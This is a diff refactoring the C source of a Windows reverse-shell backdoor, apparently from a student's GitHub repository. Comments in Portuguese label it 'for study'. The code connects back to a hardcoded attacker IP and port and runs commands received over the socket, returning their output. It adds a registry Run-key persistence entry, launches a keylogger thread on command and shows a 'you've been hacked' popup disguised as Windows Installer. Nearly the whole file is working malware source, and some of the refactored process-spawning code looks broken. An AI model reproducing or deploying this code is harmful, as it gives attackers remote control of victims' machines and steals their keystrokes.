@@ -1,188 +1,181 @@
 /*
-Criado por Jean(Kripto-Sec) estudante de segurança da informação
-Criado apenas para fins educativos não use para beneficio proprio
-Apenas para estudo 
-github: https://github.com/Kripto-Sec
-bom estudo
-*/
+ * Criado por Jean(Kripto-Sec) estudante de segurança da informação
+ * Criado apenas para fins educativos não use para beneficio proprio
+ * Apenas para estudo
+ * github: https://github.com/Kripto-Sec
+ * bom estudo
+ */
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+#include <direct.h>
+#include <Windows.h>
 #include <winsock2.h>
-#include <windows.h>
-#include <winuser.h>
-#include <wininet.h>
-#include <windowsx.h>
+#include <ws2tcpip.h>
 #include <string.h>
-#include <sys/stat.h>
-#include <sys/types.h>
 #include "keylogger.h"
 
-#define bzero(p, size) (void) memset((p), 0, (size))
+#pragma comment(lib, "Ws2_32.lib")
 
 int sock;
 
-int bootRun()
+int boot_run()
 {
-    char err[128] = "Erro\n";
-    char suc[128] = "Persistencia Criada em : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
-    TCHAR szPath[MAX_PATH];
-    DWORD pathLen = 0;
+    const char* err = "Erro\n";
+    const char* suc = "Persistencia Criada em : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+    
+    TCHAR path[MAX_PATH];
+    DWORD path_len = GetModuleFileName(NULL, path, MAX_PATH);
 
-    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
-    if (pathLen == 0){
-        send(sock, err, sizeof(err), 0);
+    if (path_len == 0) {
+        send(sock, err, strlen(err), 0);
         return -1;
     }
 
-    HKEY NewVal;
+    HKEY new_val;
+    
     //quando chamado cria um NewVal Hkey onde a persistencia sera inserida
-    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &new_val) != ERROR_SUCCESS) {
         send(sock, err, sizeof(err), 0);
         return -1;
     }
-    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
+    DWORD path_len_in_bytes = path_len * sizeof(*path);
+
     //caso queira modifique o campo "TEXT" para o nome de sua preferencia
-    if (RegSetValueEx(NewVal, TEXT("Hackeado"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
-        RegCloseKey(NewVal);
+    if (RegSetValueEx(new_val, TEXT("Hackeado"), 0, REG_SZ, (LPBYTE)path, path_len_in_bytes) != ERROR_SUCCESS) {
+        RegCloseKey(new_val);
         send(sock, err, sizeof(err), 0);
         return -1;
     }
-    RegCloseKey(NewVal);
-    send(sock, suc, sizeof(suc),0);
+    RegCloseKey(new_val);
+    send(sock, suc, sizeof(suc), 0);
     return 0;
 }
 
-char *
-str_cut(char str[], int slice_from, int slice_to)
-{
-        if (str[0] == '\0')
-                return NULL;
-
-        char *buffer;
-        size_t str_len, buffer_len;
-
-        if (slice_to < 0 && slice_from > slice_to) {
-                str_len = strlen(str);
-                if (abs(slice_to) > str_len - 1)
-                        return NULL;
-
-                if (abs(slice_from) > str_len)
-                        slice_from = (-1) * str_len;
-
-                buffer_len = slice_to - slice_from;
-                str += (str_len + slice_from);
-
-        } else if (slice_from >= 0 && slice_to > slice_from) {
-                str_len = strlen(str);
-
-                if (slice_from > str_len - 1)
-                        return NULL;
-                buffer_len = slice_to - slice_from;
-                str += slice_from;
-
-        } else
-                return NULL;
-
-        buffer = calloc(buffer_len, sizeof(char));
-        strncpy(buffer, str, buffer_len);
-        return buffer;
-}
-
-//vai ser usada para dar comandos ao sistema
-void Shell(){
-    //criando 3 variais para ser chamada la em baixo
+// vai ser usada para dar comandos ao sistema
+void shell() {
+    // criando 2 variáveis para ser usadas lá em baixo
     char buffer[1024];
     char container[1024];
-    char total_response[18384];
 
-    while (1){
-        jump:
-        bzero(buffer, 1024);
-        bzero(container, sizeof(container));
-        bzero(total_response, sizeof(total_response));
+    while (1) {
+        ZeroMemory(buffer, 1024);
+        ZeroMemory(container, sizeof(container));
         recv(sock, buffer, 1024, 0);
 
-        //strncmp para compara se a string q e igual ao buffer para fechar a conecxao
-        if (strncmp("q", buffer, 1) == 0){
+        // strncmp para compara se a string q e igual ao buffer para fechar a conexão
+        if (strncmp("q", buffer, strlen(buffer)) == 0) {
             closesocket(sock);
             WSACleanup();
-            exit(0);
+            return;
         }
-        else if (strncmp("cd ", buffer, 3) == 0){
-            chdir(str_cut(buffer,3,100));
 
-        }else if (strncmp("persistence", buffer, 11) == 0){
-            bootRun();
+        else if (strncmp("cd ", buffer, 3) == 0) 
+            _chdir((const char*)(buffer+3));
+
+        else if (strncmp("persistence", buffer, 11) == 0) 
+            boot_run();
+        
+        else if (strncmp("keylog_start", buffer, 12) == 0) {
+            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
+            if (thread != INVALID_HANDLE_VALUE && thread != NULL)   // não usamos a HANDLE da thread em momento nenhum
+                CloseHandle(thread);                                // note que fechar a HANDLE não fecha o objeto
         }
-        else if (strncmp("keylog_start", buffer, 12) == 0){
-            HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
-            goto jump;
-        }
+
         else {
+            // executar o buffer
+            char* total_response = malloc(18384);
+            if (total_response != 0) {
+                ZeroMemory(total_response, 18384);
+                SECURITY_ATTRIBUTES attributes;
 
-            //aqui ta basicamente dizendo para ler esse buffer e executalo
-            FILE *fp;
-            fp = _popen(buffer, "r");
-            while(fgets(container,1024,fp) != NULL){
-                strcat(total_response,container);
+                HANDLE r_stdout, w_stdout;
+                HANDLE r_stdin, w_stdin;
 
+                attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+                attributes.bInheritHandle = TRUE;
+                attributes.lpSecurityDescriptor = NULL;
+
+                CreatePipe(&r_stdout, &w_stdout, &attributes, 0);
+                SetHandleInformation(r_stdout, HANDLE_FLAG_INHERIT, 0);
+                CreatePipe(&r_stdin, &w_stdin, &attributes, 0);
+                SetHandleInformation(r_stdin, HANDLE_FLAG_INHERIT, 0);
+
+                PROCESS_INFORMATION proc_info;
+                STARTUPINFO startup_info;
+
+                ZeroMemory(&proc_info, sizeof(PROCESS_INFORMATION));
+                ZeroMemory(&startup_info, sizeof(STARTUPINFO));
+
+                startup_info.cb = sizeof(STARTUPINFO);
+                startup_info.hStdError  = w_stdout;
+                startup_info.hStdOutput = w_stdout;
+                startup_info.hStdInput  = r_stdin;
+                startup_info.dwFlags |= STARTF_USESTDHANDLES;
+
+                CreateProcess(TEXT("command"), TEXT("execute"), NULL, NULL, TRUE,
+                    0, NULL, NULL, &startup_info, &proc_info);
+
+                DWORD bytes_written = 0;
+                WriteFile(w_stdin, buffer, 1024, &bytes_written, NULL);
+                
+                if (ReadFile(r_stdout, container, 1024, &bytes_written, NULL)) {
+                    container[1023] = '\0';     // assegura uma null-terminated string
+                    strcat_s(total_response, 18384, container);
+                }
+
+                TerminateProcess(proc_info.hProcess, 0);
+
+                CloseHandle(proc_info.hProcess);
+                CloseHandle(proc_info.hThread);
+                CloseHandle(r_stdout);
+                CloseHandle(w_stdout);
+                CloseHandle(r_stdin);
+                CloseHandle(w_stdin);
+
+                send(sock, total_response, sizeof(total_response), 0);
+                free(total_response);
             }
-            send(sock,total_response, sizeof(total_response), 0);
-            fclose(fp);
-        }
 
+            else 
+                send(sock, "malloc() failed at shell()", 27, 0);
+        }
     }
 }
 
-
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
-
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-
-    ShowWindow(stealth, 0);
-
-    struct sockaddr_in ServAddr;
-    unsigned short ServePort;
-    char *ServeIP;
-    WSADATA wsaData;
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
+    struct sockaddr_in serv_addr;
+    WSADATA wsa_data;
 
     //definindo o ip atacante e a porta
-    ServeIP = "192.168.0.105";
-    ServePort = 50005;
+    const char* server_ip = "192.168.0.105";
+    const unsigned short server_port = 50005;
 
-     /*A estrutura WSADATA contem informacoes sobre
-     A implementacao do windows sockets
-     O parametro MAKEWORD(2,0) de WSAStartup faz uma solicitacao
-     Para a versao do 2.0 do winsock no sistema e define a versao aprovada
-     Como a versao mais alta do suporte windows socket que podemos usar */
-    if (WSAStartup(MAKEWORD(2,0), &wsaData ) != 0){
-        exit(1);
-    }
-    //definindo o object socket fora da main func
-    //pq vamos usar ele em outras func
+    /* A estrutura WSADATA contem informacoes sobre
+     * A implementacao do windows sockets
+     * O parametro MAKEWORD(2,0) de WSAStartup faz uma solicitacao
+     * Para a versao do 2.0 do winsock no sistema e define a versao aprovada
+     * Como a versao mais alta do suporte windows socket que podemos usar 
+     */
+    if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0)
+        return 1;
+
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    //usando o manset para limpar as var 0
-    memset(&ServAddr, 0, sizeof(ServAddr));
-    ServAddr.sin_family = AF_INET;
-    ServAddr.sin_addr.s_addr = inet_addr(ServeIP);
-    ServAddr.sin_port = htons(ServePort);
-
+    //usando o memset para limpar as var 0
+    ZeroMemory(&serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, server_ip, &serv_addr.sin_addr);
+    serv_addr.sin_port = htons(server_port);
 
     //loop que tenta conectar
-    start:
-    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
-    {
-        sleep(10);
-        goto start;
-
-    }
+    while (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0)
+        Sleep(10);
+    
     //comente esta parte caso nao queira um popup
     MessageBox(NULL, TEXT("Voce foi hackeado parabens!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
+    
     //chama a shell la em cima
-    Shell();
+    shell();
+
+    return 0;
 }
